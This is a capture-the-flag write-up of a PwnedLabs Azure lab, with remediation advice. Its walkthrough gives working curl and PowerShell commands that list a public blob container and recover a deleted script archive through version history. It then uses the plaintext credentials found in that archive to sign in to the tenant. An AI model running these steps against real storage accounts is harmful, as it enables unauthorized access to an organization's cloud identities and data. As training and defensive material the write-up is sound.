## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/azure-blob-container-to-initial-access

---
## Vulnerability Summary
The environment is vulnerable to **Information Disclosure** and **Account Compromise** due to the improper configuration of Azure Blob Storage and the exposure of sensitive scripts.

1. **Public Blob Exposure**: The `$web` container in the Azure Storage Account was configured with public access, allowing unauthenticated listing of its contents via the Blob Service REST API.
2. **Version History Leakage**: By leveraging the `x-ms-version` header and the `include=versions` parameter, the attacker successfully discovered historical versions of sensitive files (`scripts-transfer.zip`) that had been "deleted" or overwritten.
3. **Credential Harvesting**: The unzipped scripts contained plaintext credentials and automated logic for authenticating into the organization's Azure environment.
4. **Initial Access & Privilege Escalation**: Using the exfiltrated credentials, the attacker successfully performed an OAuth 2.0 device code flow (`az login --use-device-code`) to gain an authenticated session in the target's Entra ID (Azure AD) tenant, leading to the retrieval of account details and flags.

---
## Walkthrough
The lab starts with a publicly exposed URL `https://dev.megabigtech.com/$web/index.html`. Navigate here and inspect the web page and we find a references to `https://mbtwebsite.blob.core.windows.net/$web/...`

`mbtwebsite` = name of the Azure Storage Account associated with the website
`blob.core.windows.net` = Azure Blob Storage Service
`$web` = name of the container hosting the web, and it is situated within the storage account

Working in linux but following the lab, we use `pwsh` and and `iwr` enumerate the blob storage :
- Ensure PowerShell and Azure CLI are installed

```PowerShell
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head
```

Expand the headers using `Select-Object` as they were truncated in the output:

```bash
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers
	x-ms-blob-type: BlockBlob
	Server: Windows-Azure-Blob

# Or on Linux
curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html
```

Explore `$web` more and navigate in a browser to `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

Return all blobs in a XML document:
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

Return just directories in the container, specify a delimiter: 
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&delimiter=%2F`

List previous blob versions:
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions`
- the `versions` parameter is only supported by version `2019-12-12` and later.
- specify version of the operation by setting `x-ms-version` and rerun:
```bash
apt install libxml2-utils
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
	<Name>scripts-transfer.zip</Name>
	<VersionId>2025-08-07T21:08:03.6678148Z</VersionId>
```

We see the blob `scripts-transfer.zip` and the version ID that allows us to download it:

```bash
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' --output scripts-transfer.zip
```

Unzipping, we find two scripts. Both contain credentials! Running these scripts we get an error and must install the `MSAL.PS` module first:

```PowerShell
./entra_users.ps1
	Import-Module MSAL.PS Error

Install-Module -Name MSAL.PS

./entra_users.ps1
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code BWNFVTVC7 to authenticate.

# Open Browser > navigate to https://login.microsoft.com/device and enter code > Enter email and password from `entra_users.ps1` > Continue > Return to Terminal for Entra Users output (Azure AD)
```

To get flag, run following commands:

```PowerShell
Install-Module -Name Az
Import-Module -Name Az
Connect-AzAccount
Get-AzADUser -SignedIn | fl
	flag

# OR use linux (linux works)
az login --use-device-code
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code ES6QHV5UX to authenticate.
az ad signed-in-user show
```

---
## Remediations
1. **Restrict Public Access**:
   - Enable `Allow Blob public access: Disabled` at the storage account level. This effectively overrides any container-level public settings.
   - Use **Shared Access Signatures (SAS)** with strictly limited scopes and expiry times if public access is required for specific assets.

2. **Manage Versioning Securely**:
   - Periodically audit storage account versioning. If versioning is enabled for compliance, ensure that access to older versions is restricted by strict RBAC policies.
   - Do not use storage accounts as repositories for sensitive scripts or configuration files, even if you believe the files are "hidden" or "deleted."

3. **Secure Secrets Lifecycle**:
   - Never embed credentials in scripts. Use **Azure Key Vault** to store and retrieve secrets programmatically using Managed Identities.
   - Implement **Microsoft Entra ID (Azure AD) Managed Identities** for automated scripts to eliminate the need for hardcoded service principal credentials.

4. **Monitoring & Governance**:
   - Enable **Azure Storage Logging** and monitor for anomalous API requests, such as listing operations with `include=versions` parameters.
   - Use **Microsoft Defender for Storage** to automatically detect and alert on unauthorized access attempts or suspicious configuration changes.
